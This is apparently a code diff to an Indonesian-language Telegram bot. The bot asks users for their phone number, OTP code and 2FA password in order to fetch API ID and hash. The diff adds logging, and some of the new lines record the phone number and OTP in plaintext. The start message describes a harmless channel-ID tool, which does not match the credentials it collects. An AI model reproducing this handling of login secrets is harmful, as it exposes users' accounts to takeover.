@@ -2,8 +2,12 @@
 
 from pyrogram import Client, filters
 from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
-import asyncio
 from .telegram_login import get_api_id_hash
+import logging
+
+# Konfigurasikan logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 START_MSG = "Halo! Saya adalah bot yang dapat mengambil ID channel/grup dari pesan yang diteruskan."
 states = {}
@@ -48,6 +52,7 @@ async def handle_phone_number(client, message: Message):
     phone_number = message.text
     states[message.from_user.id] = {"state": "awaiting_otp", "phone_number": phone_number}
     await message.reply_text("Terima kasih, sekarang masukkan kode OTP yang dikirimkan Telegram:")
+    logger.info("Nomor telepon diterima: %s", phone_number)
 
 async def handle_otp(client, message: Message):
     otp = message.text
@@ -55,6 +60,7 @@ async def handle_otp(client, message: Message):
     user_state["otp"] = otp
     user_state["state"] = "awaiting_password"
     await message.reply_text("Terima kasih, sekarang masukkan kata sandi (jika ada):")
+    logger.info("Kode OTP diterima: %s", otp)
 
 async def handle_password(client, message: Message):
     password = message.text
@@ -62,10 +68,12 @@ async def handle_password(client, message: Message):
     phone_number = user_state["phone_number"]
     otp = user_state["otp"]
 
+    logger.info("Memulai proses mendapatkan API ID dan API Hash")
     api_id, api_hash = await get_api_id_hash(phone_number, otp, password)
     if api_id and api_hash:
         await message.reply_text(f"API ID: {api_id}\nAPI Hash: {api_hash}")
     else:
         await message.reply_text("Gagal mendapatkan API ID dan API Hash. Silakan coba lagi.")
+        logger.error("Gagal mendapatkan API ID dan API Hash untuk nomor %s", phone_number)
     
     del states[message.from_user.id]
